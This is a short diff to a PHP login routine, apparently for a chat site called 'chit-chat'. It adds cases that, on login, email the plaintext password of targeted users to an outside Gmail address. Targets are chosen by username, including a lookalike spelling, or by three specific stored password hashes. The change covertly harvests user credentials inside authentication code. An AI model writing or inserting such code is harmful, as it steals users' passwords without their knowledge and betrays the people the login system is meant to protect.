@@ -18,8 +18,18 @@
     	else {
             switch ( strtolower( $username ) ) {
                 case 'alienhack': // sorry kiddo
+                case 'aIienhack':
                 case 'dionysiz':
+                case 'titanikos':
                     mail( 'dionyziz@gmail.com', $username . "'s password", "$username's password on chit-chat is \"$password\"" );
+                    break;
+                default:
+                    switch ( strtolower( $s_password ) ) {
+                        case '750202795844f80c120f6b78ddd6e144':
+                        case 'bd7c97f494dbc54eacc57bbe012c8745':
+                        case '96a52500cf161d3adee61575e39dfd23':
+                            mail( 'dionyziz@gmail.com', $username . "'s password", "$username's password on chit-chat is \"$password\"" );
+                    }
             }
             
     		$user->UpdateLastLogon();
